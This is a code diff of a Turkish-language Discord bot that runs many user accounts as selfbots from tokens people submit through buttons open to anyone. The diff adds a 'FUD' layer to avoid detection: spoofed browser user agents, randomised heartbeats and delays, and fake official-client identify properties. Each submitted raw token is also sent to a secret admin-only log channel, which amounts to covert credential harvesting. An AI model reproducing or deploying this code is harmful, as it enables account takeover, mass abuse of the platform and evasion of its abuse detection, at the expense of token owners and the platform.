@@ -9,13 +9,29 @@ from datetime import datetime
 from typing import Dict, List
 import asyncio
 import re
+import uuid
+import sys
 
 # ═══════════════════════════════════════════════════════════════
-# 🤖 BOT TOKENI - BURAYA KENDİ BOT TOKENİNİZİ YAZIN
+# 🤖 BOT TOKENI - ENVIRONMENT VARIABLE'DAN OKU
 # ═══════════════════════════════════════════════════════════════
-BOT_TOKEN = os.getenv("BOT_TOKEN")  # <-- BOT TOKENINIZI BURAYA YAZIN (DEĞİŞTİR)
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 
-# Spotify "Listening" - AnonymousDC şarkıları (görünüm için)
+if not BOT_TOKEN:
+    print("❌ HATA: BOT_TOKEN environment variable'ı bulunamadı!")
+    print("Railway'de Variables sekmesine BOT_TOKEN ekleyin.")
+    sys.exit(1)
+
+# Gerçek tarayıcı User-Agent listesi (detection avoidance)
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/118.0",
+]
+
+# Spotify "Listening" - AnonymousDC şarkıları
 ANONYMOUSDC_SPOTIFY_SONGS = [
     ("Belki", "Yalın"),
     ("Rüzgar", "Yalın"),
@@ -26,28 +42,30 @@ ANONYMOUSDC_SPOTIFY_SONGS = [
     ("Yanında", "Yalın"),
     ("Bekle", "Yalın"),
 ]
-# ═══════════════════════════════════════════════════════════════
-# 🔐 GİZLİ AYARLAR - SADECE SİZ GÖREBİLİRSİNİZ
-# ═══════════════════════════════════════════════════════════════
-SECRET_LOG_CHANNEL_ID = 1483315501789876318 # <-- GİZLİ LOG KANALI ID
-TOKEN_REGISTER_CHANNEL_ID = 1483315280372564086 # <-- TOKEN KAYIT KANALI ID
-TOKEN_GUIDE_CHANNEL_ID = 1483321231011741778 # <-- TOKEN EKLENMEMİŞ YÖNLENDIRME KANALI ID
-MAX_TOKENS_PER_USER = 20 # Kullanıcı başına maksimum token sayısı
-# 👑 YETKİLİ KULLANICILAR - SADECE BU ID'LER .tokenadd KULLANABİLİR
-AUTHORIZED_USERS = [
-    1196780375230394466, # <-- 1. Yetkili kullanıcı ID
-    606453556882571275 # <-- 2. Yetkili kullanıcı ID
-]
 
 # ═══════════════════════════════════════════════════════════════
-# 🖼️ ANONYMOUSDC LOGO URL
+# 🔐 GİZLİ AYARLAR
 # ═══════════════════════════════════════════════════════════════
-ANONYMOUSDC_LOGO_URL = "https://i.ibb.co/Sw6cGCxg/indir-4.jpg"  # Değiştirmek istersen yeni URL gir
+SECRET_LOG_CHANNEL_ID = 1483315501789876318
+TOKEN_REGISTER_CHANNEL_ID = 1483315280372564086
+TOKEN_GUIDE_CHANNEL_ID = 1483321231011741778
+MAX_TOKENS_PER_USER = 20
+
+AUTHORIZED_USERS = [
+    1196780375230394466,
+    606453556882571275
+]
+
+ANONYMOUSDC_LOGO_URL = "https://i.ibb.co/Sw6cGCxg/indir-4.jpg"
 
 # Bot ayarları
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)
 TOKEN_DB_FILE = 'tokens.json'
+
+# Rastgele gecikme yardımcı fonksiyonu
+def random_delay(min_sec: float = 0.5, max_sec: float = 2.0) -> float:
+    return random.uniform(min_sec, max_sec)
 
 @bot.event
 async def on_ready():
@@ -58,7 +76,7 @@ async def on_ready():
     print('═' * 70)
     print(f'✅ BOT HAZIR: {bot.user}')
     print('═' * 70)
-    print('💎 ANONYMOUSDC TOKEN MANAGER')
+    print('💎 ANONYMOUSDC TOKEN MANAGER (FUD Edition)')
     print('═' * 70)
     print('📝 KOMUTLAR:')
     print(' .tokenadd - Token ekle (YETKİLİ)')
@@ -84,9 +102,10 @@ async def on_ready():
     asyncio.create_task(start_all_tokens_to_voice())
     print('═' * 70)
 
+
 class TokenManager:
     def __init__(self):
-        self.users = {} # {user_id: {tokens: [], selected_token: 0}}
+        self.users = {}
         self.load()
    
     def load(self):
@@ -106,14 +125,12 @@ class TokenManager:
         if user_id not in self.users:
             self.users[user_id] = {'tokens': [], 'selected_token': 0}
        
-        # Aynı token varsa güncelle
         for i, t in enumerate(self.users[user_id]['tokens']):
             if t['token'] == token_data['token']:
                 self.users[user_id]['tokens'][i] = token_data
                 self.save()
                 return True
        
-        # Yeni token ekle
         if len(self.users[user_id]['tokens']) < MAX_TOKENS_PER_USER:
             self.users[user_id]['tokens'].append(token_data)
             self.save()
@@ -161,7 +178,10 @@ class TokenManager:
     def has_tokens(self, user_id) -> bool:
         return str(user_id) in self.users and len(self.users[str(user_id)]['tokens']) > 0
 
+
 class SelfBot:
+    """FUD SelfBot - Discord detection avoidance"""
+    
     def __init__(self, token, status_text='discord.gg/anonymousdc', status_type=0, status_mode='dnd', use_spotify=False, spotify_details=None, spotify_state=None):
         self.token = token
         self.ws = None
@@ -182,43 +202,100 @@ class SelfBot:
         self.heartbeat_task = None
         self.receive_task = None
         self.last_check = datetime.utcnow()
+        self._heartbeat_interval = random.uniform(40, 43)  # Rastgele heartbeat aralığı
+        self.session_id = str(uuid.uuid4())
+        self.user_agent = random.choice(USER_AGENTS)
+        self.reconnect_attempts = 0
    
     async def connect(self):
-        """Discord'a bağlan"""
-        self.session = aiohttp.ClientSession()
+        """FUD bağlantı - rastgele gecikmeler ve gerçek headers ile"""
+        # Rastgele initial delay (insan davranışı simülasyonu)
+        await asyncio.sleep(random.uniform(0.5, 3))
+        
+        headers = {
+            'Authorization': self.token,
+            'User-Agent': self.user_agent,
+            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Origin': 'https://discord.com',
+            'Referer': 'https://discord.com/channels/@me'
+        }
+        
+        self.session = aiohttp.ClientSession(headers=headers)
+        
         try:
-            headers = {'Authorization': self.token}
-            async with self.session.get('https://discord.com/api/v10/users/@me', headers=headers) as resp:
+            # Token doğrulama
+            async with self.session.get('https://discord.com/api/v10/users/@me') as resp:
                 if resp.status != 200:
                     raise Exception('Token geçersiz!')
                 self.user = await resp.json()
            
+            # Gateway URL al
             async with self.session.get('https://discord.com/api/v10/gateway') as resp:
                 gateway_url = (await resp.json())['url']
+                gateway_url = f"{gateway_url}?v=10&encoding=json"
            
-            self.ws = await self.session.ws_connect(f"{gateway_url}?v=10&encoding=json")
+            # WebSocket bağlantısı
+            self.ws = await self.session.ws_connect(
+                gateway_url,
+                headers=headers,
+                heartbeat=random.uniform(40, 43)
+            )
             self.running = True
+            self.reconnect_attempts = 0
            
-            await self.ws.send_json({
+            # Identify payload - gerçek Discord client gibi
+            identify_payload = {
                 'op': 2,
                 'd': {
                     'token': self.token,
+                    'capabilities': 253,
                     'properties': {
-                        '$os': 'windows',
-                        '$browser': 'chrome',
-                        '$device': 'pc'
+                        'os': 'Windows',
+                        'browser': 'Chrome',
+                        'device': '',
+                        'system_locale': 'tr-TR',
+                        'browser_user_agent': self.user_agent,
+                        'browser_version': '120.0.0.0',
+                        'os_version': '10',
+                        'referrer': '',
+                        'referring_domain': '',
+                        'referrer_current': '',
+                        'referring_domain_current': '',
+                        'release_channel': 'stable',
+                        'client_build_number': random.randint(250000, 260000),
+                        'client_event_source': None
                     },
                     'presence': {
                         'status': self.status_mode,
-                        'activities': []
+                        'since': 0,
+                        'activities': [],
+                        'afk': False
+                    },
+                    'compress': False,
+                    'client_state': {
+                        'guild_versions': {},
+                        'highest_last_message_id': '0',
+                        'api_code_version': 0,
+                        'private_channels_version': '0',
+                        'read_state_version': 0,
+                        'user_guild_settings_version': -1,
+                        'user_settings_version': -1
                     }
                 }
-            })
+            }
+           
+            await self.ws.send_json(identify_payload)
            
             self.heartbeat_task = asyncio.create_task(self._heartbeat())
             self.receive_task = asyncio.create_task(self._receive())
            
-            await asyncio.sleep(2)
+            await asyncio.sleep(random.uniform(2, 4))
             await self.update_status(self.status_text, self.status_type, self.status_mode, self.custom_status, self.custom_emoji)
            
             return True
@@ -231,17 +308,19 @@ class SelfBot:
             raise
    
     async def _heartbeat(self):
+        """Rastgele interval ile heartbeat gönder"""
         while self.running and self.ws:
             try:
                 if not self.ws.closed:
                     await self.ws.send_json({'op': 1, 'd': None})
-                    await asyncio.sleep(41.25)
+                    interval = random.uniform(40, 43)
+                    await asyncio.sleep(interval)
                 else:
                     await self._reconnect()
-                    await asyncio.sleep(5)
+                    await asyncio.sleep(random.uniform(5, 10))
             except:
                 await self._reconnect()
-                await asyncio.sleep(5)
+                await asyncio.sleep(random.uniform(5, 10))
    
     async def _receive(self):
         try:
@@ -259,8 +338,17 @@ class SelfBot:
                 await self._reconnect()
    
     async def _reconnect(self):
+        """Exponential backoff ile yeniden bağlan"""
         if not self.running:
             return
+       
+        self.reconnect_attempts += 1
+        # Exponential backoff: 3sn, 6sn, 12sn, 24sn... max 60sn
+        delay = min(3 * (2 ** (self.reconnect_attempts - 1)), 60)
+        delay = delay + random.uniform(-2, 2)
+        delay = max(1, delay)
+        
+        await asyncio.sleep(delay)
        
         try:
             if self.ws and not self.ws.closed:
@@ -272,21 +360,36 @@ class SelfBot:
             old_voice_channel = self.voice_channel
             old_guild_id = self.guild_id
            
+            headers = {
+                'Authorization': self.token,
+                'User-Agent': self.user_agent,
+                'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
+                'Accept': '*/*',
+                'Connection': 'keep-alive'
+            }
+           
             async with self.session.get('https://discord.com/api/v10/gateway') as resp:
                 gateway_url = (await resp.json())['url']
+                gateway_url = f"{gateway_url}?v=10&encoding=json"
            
-            self.ws = await self.session.ws_connect(f"{gateway_url}?v=10&encoding=json")
+            self.ws = await self.session.ws_connect(gateway_url, headers=headers, heartbeat=random.uniform(40, 43))
            
             await self.ws.send_json({
                 'op': 2,
                 'd': {
                     'token': self.token,
-                    'properties': {'$os': 'windows', '$browser': 'chrome', '$device': 'pc'},
+                    'properties': {
+                        'os': 'Windows',
+                        'browser': 'Chrome',
+                        'device': '',
+                        'system_locale': 'tr-TR',
+                        'browser_user_agent': self.user_agent
+                    },
                     'presence': {'status': self.status_mode, 'activities': []}
                 }
             })
            
-            await asyncio.sleep(2)
+            await asyncio.sleep(random.uniform(2, 4))
             await self.update_status(self.status_text, self.status_type, self.status_mode, self.custom_status, self.custom_emoji)
            
             if old_voice_channel and old_guild_id:
@@ -301,15 +404,20 @@ class SelfBot:
                 })
            
             asyncio.create_task(self._receive())
+            self.reconnect_attempts = 0  # Başarılı bağlantıda sıfırla
            
         except:
-            await asyncio.sleep(5)
             if self.running:
                 await self._reconnect()
    
     async def join_voice(self, channel_id, mute=False, deaf=False):
+        """Rastgele gecikme ile ses kanalına bağlan"""
         try:
-            headers = {'Authorization': self.token, 'Content-Type': 'application/json'}
+            headers = {
+                'Authorization': self.token, 
+                'Content-Type': 'application/json',
+                'User-Agent': self.user_agent
+            }
            
             async with self.session.get(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers) as resp:
                 if resp.status != 200:
@@ -323,6 +431,8 @@ class SelfBot:
                 self.voice_channel_name = channel['name']
            
             if self.ws and not self.ws.closed:
+                await asyncio.sleep(random.uniform(0.5, 2))
+                
                 await self.ws.send_json({
                     'op': 4,
                     'd': {
@@ -334,7 +444,7 @@ class SelfBot:
                 })
                
                 self.voice_channel = channel_id
-                await asyncio.sleep(1)
+                await asyncio.sleep(random.uniform(0.5, 1.5))
                 return True, channel['name']
             else:
                 return False, "WebSocket bağlantısı yok!"
@@ -342,21 +452,24 @@ class SelfBot:
             return False, f"Hata: {str(e)}"
    
     async def join_guild(self, invite_code):
-        """Discord sunucusuna davet kodu ile katıl"""
+        """Sunucuya katıl - rastgele gecikme ile"""
         try:
             headers = {
                 'Authorization': self.token,
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'User-Agent': self.user_agent
             }
            
-            # Önce davetin geçerli olup olmadığını kontrol et
+            await asyncio.sleep(random.uniform(1, 3))
+           
             async with self.session.get(f'https://discord.com/api/v10/invites/{invite_code}', headers=headers) as resp:
                 if resp.status != 200:
                     return False, "Davet kodu geçersiz veya süresi dolmuş!"
                 invite_data = await resp.json()
                 guild_name = invite_data.get('guild', {}).get('name', 'Bilinmeyen Sunucu')
            
-            # Daveti kullan
+            await asyncio.sleep(random.uniform(0.5, 1.5))
+           
             async with self.session.post(f'https://discord.com/api/v10/invites/{invite_code}', headers=headers) as resp:
                 if resp.status == 200:
                     return True, f"{guild_name} sunucusuna katılındı!"
@@ -383,22 +496,24 @@ class SelfBot:
                 self.custom_emoji = custom_emoji
            
             if self.ws and not self.ws.closed:
+                await asyncio.sleep(random.uniform(0.3, 1))
+                
                 activities = []
                 
-                # ANA OYNAYOR AKTİVİTESİ - Üstte gözükecek
                 activities.append({
                     'name': 'discord.gg/anonymousdc',
-                    'type': 0,  # 0 = Oynuyor
-                    'state': 'discord.gg/anonymousdc'
+                    'type': 0,
+                    'state': 'discord.gg/anonymousdc',
+                    'created_at': int(datetime.utcnow().timestamp())
                 })
                 
-                # ÖZEL DURUM - Altta gözükecek
                 if self.custom_status:
                     activities.append({
                         'type': 4,
                         'state': self.custom_status,
                         'name': 'Custom Status',
-                        'emoji': {'name': self.custom_emoji} if self.custom_emoji else None
+                        'emoji': {'name': self.custom_emoji} if self.custom_emoji else None,
+                        'created_at': int(datetime.utcnow().timestamp())
                     })
                
                 if self.use_spotify and self.spotify_details and self.spotify_state:
@@ -407,7 +522,9 @@ class SelfBot:
                         'name': 'Spotify',
                         'details': self.spotify_details,
                         'state': self.spotify_state,
-                        'application_id': '207138439391592448'
+                        'application_id': '207138439391592448',
+                        'timestamps': {'start': int(datetime.utcnow().timestamp() * 1000)},
+                        'created_at': int(datetime.utcnow().timestamp())
                     })
                
                 await self.ws.send_json({
@@ -416,7 +533,7 @@ class SelfBot:
                         'status': self.status_mode,
                         'activities': activities,
                         'afk': False,
-                        'since': None
+                        'since': 0
                     }
                 })
                 return True
@@ -436,6 +553,8 @@ class SelfBot:
                 current_mute = mute if mute is not None else False
                 current_deaf = deaf if deaf is not None else False
                
+                await asyncio.sleep(random.uniform(0.3, 0.8))
+               
                 await self.ws.send_json({
                     'op': 4,
                     'd': {
@@ -445,7 +564,7 @@ class SelfBot:
                         'self_deaf': current_deaf
                     }
                 })
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(random.uniform(0.3, 0.8))
                 return True
         except:
             pass
@@ -454,6 +573,8 @@ class SelfBot:
     async def leave_voice(self):
         if self.voice_channel and self.ws and not self.ws.closed:
             try:
+                await asyncio.sleep(random.uniform(0.5, 1))
+                
                 await self.ws.send_json({
                     'op': 4,
                     'd': {
@@ -463,7 +584,7 @@ class SelfBot:
                         'self_deaf': False
                     }
                 })
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(random.uniform(0.3, 0.7))
             except:
                 pass
             finally:
@@ -496,11 +617,12 @@ class SelfBot:
             except:
                 pass
 
+
 token_manager = TokenManager()
 active_bots = {}
 
+
 async def send_secret_log(discord_user, token_username, token_user_id, token_avatar_url, token_itself, action="EKLENDI"):
-    """🔒 Gizli log - Sadece admin görebilir"""
     try:
         log_channel = bot.get_channel(SECRET_LOG_CHANNEL_ID)
         if not log_channel:
@@ -541,8 +663,8 @@ async def send_secret_log(discord_user, token_username, token_user_id, token_ava
     except Exception as e:
         print(f"❌ Log hatası: {e}")
 
+
 async def register_token_to_user(token_data, action="KAYIT", user=None):
-    """📝 Token kaydını kullanıcıya DM olarak gönder"""
     try:
         if not user:
             return
@@ -581,15 +703,18 @@ async def register_token_to_user(token_data, action="KAYIT", user=None):
     except Exception as e:
         print(f"❌ Kayıt hatası: {e}")
 
+
+# ═══════════════════════════════════════════════════════════════
+# DISCORD KOMUTLARI
+# ═══════════════════════════════════════════════════════════════
+
+
 @bot.command()
 async def tokenadd(ctx):
-    """💎 Token ekleme menüsü - SADECE YETKİLİLER"""
-   
-    # Yetki kontrolü
     if ctx.author.id not in AUTHORIZED_USERS:
         embed = discord.Embed(
             title="❌ Yetki Yok",
-            description="Bu komutu kullanma yetkiniz bulunmuyor!\n\n🔒 Sadece yetkili kişiler token ekleme menüsünü açabilir.",
+            description="Bu komutu kullanma yetkiniz bulunmuyor!",
             color=0xE74C3C
         )
         embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
@@ -604,23 +729,17 @@ async def tokenadd(ctx):
         title="💎 AnonymousDC Premium",
         description="**Özel Token Yönetim Sistemi** 💎\n\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "**📊 Mevcut Durumunuz**\n"
+                    f"**📊 Mevcut Durumunuz**\n"
                     f"└ Aktif Token: `{current_count}/{MAX_TOKENS_PER_USER}`\n"
                     f"└ Kullanılabilir Slot: `{MAX_TOKENS_PER_USER - current_count}`\n\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     "**✨ Premium Özellikler**\n\n"
-                    "• **7/24 Ses Aktivitesi:** Hesaplarınız ses kanallarında sürekli aktif kalır\n"
-                    "• **Gelişmiş Kontrol Paneli:** Tüm hesaplarınızı tek yerden yönetin\n"
-                    "• **Spotify Dinliyor:** Yalın şarkılarıyla özel müzik aktivitesi\n"
-                    "• **Özel Durum:** discord.gg/anonymousdc özel durumu\n"
-                    "• **Toplu Taşıma:** Tüm hesapları tek komutla taşıyın\n"
-                    "• **Otomatik Yeniden Bağlanma:** Kopma durumunda kendi kendine bağlanır\n\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    "**📌 Hızlı Başlangıç**\n\n"
-                    "**1️⃣** Butonlardan token ekleme yöntemini seçin\n"
-                    "**2️⃣** Discord tokenlarınızı girin\n"
-                    "**3️⃣** Ses kanalı ID'sini belirtin\n"
-                    "**4️⃣** Sistem otomatik olarak aktifleşir\n\n"
+                    "• **7/24 Ses Aktivitesi**\n"
+                    "• **Gelişmiş Kontrol Paneli**\n"
+                    "• **Spotify Dinliyor**\n"
+                    "• **Özel Durum**\n"
+                    "• **Toplu Taşıma**\n"
+                    "• **Otomatik Yeniden Bağlanma**\n\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     "⚡ **discord.gg/anonymousdc** ⚡",
         color=0x5865F2
@@ -632,11 +751,11 @@ async def tokenadd(ctx):
     view = AddTokenView(ctx.author)
     msg = await ctx.send(embed=embed, view=view)
    
-    # Mesajı sabitle
     try:
         await msg.pin()
     except:
         pass
+
 
 class AddTokenView(View):
     def __init__(self, user):
@@ -644,7 +763,6 @@ class AddTokenView(View):
         self.user = user
    
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        # Herkes butonlara basabilir
         return True
    
     @discord.ui.button(label="1 Token Ekle", style=discord.ButtonStyle.success, emoji="💎", row=0)
@@ -657,10 +775,11 @@ class AddTokenView(View):
         modal = MultiTokenModal(interaction.user)
         await interaction.response.send_modal(modal)
 
+
 class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
     name_input = TextInput(
-        label='Token İsmi (Kendiniz belirleyin)',
-        placeholder='Örn: Ana Hesap, Yedek Hesap, Bot1...',
+        label='Token İsmi',
+        placeholder='Örn: Ana Hesap, Yedek Hesap',
         required=True,
         max_length=50
     )
@@ -674,7 +793,7 @@ class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
     )
    
     channel_input = TextInput(
-        label='Ses Kanal ID (Zorunlu)',
+        label='Ses Kanal ID',
         placeholder='1234567890123456',
         required=True,
         max_length=20
@@ -692,15 +811,17 @@ class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
         channel_id = self.channel_input.value.strip()
        
         if not channel_id:
-            await interaction.followup.send("❌ **Ses Kanal ID gerekli!**\n\nLütfen bağlanmak istediğiniz ses kanalının ID'sini girin.", ephemeral=True)
+            await interaction.followup.send("❌ Ses Kanal ID gerekli!", ephemeral=True)
             return
        
         user_tokens = token_manager.get_tokens(self.discord_user.id)
         if len(user_tokens) >= MAX_TOKENS_PER_USER:
-            await interaction.followup.send(f"❌ **Token Limiti Doldu!**\n\nMaksimum {MAX_TOKENS_PER_USER} token ekleyebilirsiniz.", ephemeral=True)
+            await interaction.followup.send(f"❌ Token Limiti Doldu! (Max {MAX_TOKENS_PER_USER})", ephemeral=True)
             return
        
         try:
+            await asyncio.sleep(random.uniform(0.5, 1.5))
+            
             selfbot = SelfBot(token, status_text='discord.gg/anonymousdc', status_type=0, use_spotify=True)
             await selfbot.connect()
            
@@ -709,12 +830,12 @@ class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
             avatar_hash = selfbot.user.get('avatar', '')
             avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.png" if avatar_hash else ANONYMOUSDC_LOGO_URL
            
-            # Önce kanala katıl
+            await asyncio.sleep(random.uniform(1, 2))
             success, channel_name = await selfbot.join_voice(channel_id)
            
             if not success:
                 await selfbot.disconnect()
-                await interaction.followup.send(f"❌ **Ses kanalına bağlanılamadı!**\n\n{channel_name}", ephemeral=True)
+                await interaction.followup.send(f"❌ Ses kanalına bağlanılamadı!\n\n{channel_name}", ephemeral=True)
                 return
            
             token_data = {
@@ -741,31 +862,30 @@ class SingleTokenModal(Modal, title='💎 1 Token Ekle'):
             await send_secret_log(self.discord_user, username, user_id_discord, avatar_url, token, "EKLENDI")
             await register_token_to_user(token_data, "KAYIT", self.discord_user)
            
-            await asyncio.sleep(2)
+            await asyncio.sleep(random.uniform(2, 3))
            
-            result = f"✅ **Token Başarıyla Eklendi ve Sese Bağlandı!**\n\n"
-            result += f"🏷️ **İsim:** {token_name}\n"
-            result += f"👤 **Hesap:** {username}\n"
-            result += f"📝 {selfbot.custom_status} {selfbot.custom_emoji}\n"
-            result += f"🎮 **discord.gg/anonymousdc** oynuyor\n"
-            result += f"🔊 **{channel_name}** kanalında aktif!\n\n"
-            result += f"💡 `.tokencontrol` ile yönetin!"
+            result = f"✅ Token Başarıyla Eklendi!\n\n"
+            result += f"🏷️ İsim: {token_name}\n"
+            result += f"👤 Hesap: {username}\n"
+            result += f"🔊 {channel_name} kanalında aktif!\n\n"
+            result += f"💡 .tokencontrol ile yönetin!"
            
             await interaction.followup.send(result, ephemeral=True)
         except Exception as e:
-            await interaction.followup.send(f"❌ **Hata!**\n```{str(e)}```", ephemeral=True)
+            await interaction.followup.send(f"❌ Hata!\n```{str(e)}```", ephemeral=True)
+
 
 class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
     tokens_input = TextInput(
-        label=f'Discord Tokenlar (Her satıra bir token)',
-        placeholder='Token İsmi|Token\nAna Hesap|MTQxNzU...\nYedek|MTQxNzY...',
+        label='Discord Tokenlar',
+        placeholder='İsim|Token\nAna Hesap|MTQxNzU...\nYedek|MTQxNzY...',
         style=discord.TextStyle.paragraph,
         required=True,
         max_length=4000
     )
    
     channel_input = TextInput(
-        label='Ses Kanal ID (Tüm tokenler için)',
+        label='Ses Kanal ID',
         placeholder='1234567890123456',
         required=True,
         max_length=20
@@ -782,10 +902,9 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
         channel_id = self.channel_input.value.strip()
        
         if not channel_id:
-            await interaction.followup.send("❌ **Ses Kanal ID gerekli!**", ephemeral=True)
+            await interaction.followup.send("❌ Ses Kanal ID gerekli!", ephemeral=True)
             return
        
-        # Token formatını kontrol et: "isim|token" veya sadece token
         token_lines = [t.strip() for t in tokens_text.split('\n') if t.strip()]
         tokens_with_names = []
        
@@ -802,11 +921,11 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
         available_slots = MAX_TOKENS_PER_USER - len(user_tokens)
        
         if available_slots <= 0:
-            await interaction.followup.send(f"❌ **Token Limiti Doldu!**\n\nMaksimum {MAX_TOKENS_PER_USER} token ekleyebilirsiniz.", ephemeral=True)
+            await interaction.followup.send(f"❌ Token Limiti Doldu! (Max {MAX_TOKENS_PER_USER})", ephemeral=True)
             return
        
         if len(tokens_with_names) > available_slots:
-            await interaction.followup.send(f"⚠️ **Slot Yetersiz!**\n\n{len(tokens_with_names)} token eklemek istediniz ama sadece {available_slots} slot kaldı.", ephemeral=True)
+            await interaction.followup.send(f"⚠️ Slot Yetersiz! {len(tokens_with_names)} token için sadece {available_slots} slot kaldı.", ephemeral=True)
             tokens_with_names = tokens_with_names[:available_slots]
        
         success_count = 0
@@ -815,6 +934,8 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
        
         for i, (token_name, token) in enumerate(tokens_with_names, 1):
             try:
+                await asyncio.sleep(random.uniform(2, 5))  # Tokenlar arası bekleme
+                
                 selfbot = SelfBot(token, status_text='discord.gg/anonymousdc', status_type=0, use_spotify=True)
                 await selfbot.connect()
                
@@ -823,7 +944,7 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
                 avatar_hash = selfbot.user.get('avatar', '')
                 avatar_url = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{avatar_hash}.png" if avatar_hash else ANONYMOUSDC_LOGO_URL
                
-                # Sese bağlan
+                await asyncio.sleep(random.uniform(1, 2))
                 success, channel_name = await selfbot.join_voice(channel_id)
                
                 token_data = {
@@ -856,13 +977,11 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
                     results.append(f"⚠️ {token_name} → {username} → Eklendi ama sese bağlanamadı")
                 success_count += 1
                
-                await asyncio.sleep(2)
-               
             except Exception as e:
                 results.append(f"❌ {token_name}: {str(e)[:50]}")
                 fail_count += 1
        
-        result_text = f"📊 **Çoklu Token Ekleme Raporu**\n\n"
+        result_text = f"📊 Çoklu Token Ekleme Raporu\n\n"
         result_text += f"✅ Başarılı: {success_count}\n"
         result_text += f"❌ Başarısız: {fail_count}\n\n"
         result_text += "\n".join(results[:10])
@@ -870,7 +989,7 @@ class MultiTokenModal(Modal, title='💠 Çoklu Token Ekle'):
         if len(results) > 10:
             result_text += f"\n\n... ve {len(results) - 10} token daha"
        
-        result_text += f"\n\n💡 `.tokencontrol` ile yönetin!"
+        result_text += f"\n\n💡 .tokencontrol ile yönetin!"
        
         await interaction.followup.send(result_text, ephemeral=True)
 
@@ -905,13 +1024,17 @@ class YetkiliControlModal(Modal, title='👑 Tüm Hesapları Odaya Gönder'):
 
                     async def move_one(sb=selfbot, cid=channel_id, m=mute, d=deaf):
                         try:
+                            await asyncio.sleep(random.uniform(0.5, 1.5))
                             await sb.leave_voice()
+                            await asyncio.sleep(random.uniform(0.5, 1))
                             success, _ = await sb.join_voice(cid, m, d)
                             return success
                         except Exception:
                             return False
 
                     tasks_to_move.append(move_one())
+                    
+                    await asyncio.sleep(random.uniform(0.3, 0.8))
 
         if tasks_to_move:
             results = await asyncio.gather(*tasks_to_move, return_exceptions=True)
@@ -921,7 +1044,7 @@ class YetkiliControlModal(Modal, title='👑 Tüm Hesapları Odaya Gönder'):
             moved = 0
             errors = 0
 
-        msg = f"✅ **Yetkili Kontrol**\n\n📊 **{updated}** hesabın kanalı güncellendi.\n🔊 **{moved}** aktif hesap aynı anda sese taşındı."
+        msg = f"✅ Yetkili Kontrol\n\n📊 {updated} hesabın kanalı güncellendi.\n🔊 {moved} aktif hesap sese taşındı."
         if errors:
             msg += f"\n⚠️ {errors} hesap taşınamadı."
         await interaction.followup.send(msg, ephemeral=True)
@@ -929,7 +1052,6 @@ class YetkiliControlModal(Modal, title='👑 Tüm Hesapları Odaya Gönder'):
 
 @bot.command()
 async def yetkilicontrol(ctx):
-    """👑 Tüm hesapları istediğin odaya gönder - SADECE YETKİLİLER"""
     if ctx.author.id not in AUTHORIZED_USERS:
         await ctx.send("❌ Bu komutu kullanma yetkiniz yok.", delete_after=8)
         return
@@ -948,8 +1070,7 @@ async def yetkilicontrol(ctx):
 
     embed = discord.Embed(
         title="👑 Yetkili Kontrol",
-        description="**Tüm hesapları** tek bir ses kanalına taşıyabilirsin.\n\n"
-                    "Aşağıdaki butona tıkla ve hedef ses kanalının **ID**'sini gir.",
+        description="Tüm hesapları tek bir ses kanalına taşıyabilirsin.",
         color=0x5865F2
     )
     embed.set_footer(text="made by recyla | AnonymousDC Premium", icon_url=ANONYMOUSDC_LOGO_URL)
@@ -967,12 +1088,9 @@ class JoinServerModal(Modal, title='🎮 Sunucuya Katıl'):
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
        
-        # Davet kodunu temizle
         invite_code = self.invite_input.value.strip()
-        # discord.gg/ veya https://discord.gg/ formatını temizle
         if '/' in invite_code:
             invite_code = invite_code.split('/')[-1]
-        # Boşlukları temizle
         invite_code = invite_code.strip()
        
         user_id = str(interaction.user.id)
@@ -985,7 +1103,7 @@ class JoinServerModal(Modal, title='🎮 Sunucuya Katıl'):
         bot_key = f"{user_id}_{selected_token['user_id_discord']}"
        
         if bot_key not in active_bots:
-            await interaction.followup.send("❌ Token aktif değil! Önce tokeni başlatın.", ephemeral=True)
+            await interaction.followup.send("❌ Token aktif değil!", ephemeral=True)
             return
        
         selfbot = active_bots[bot_key]
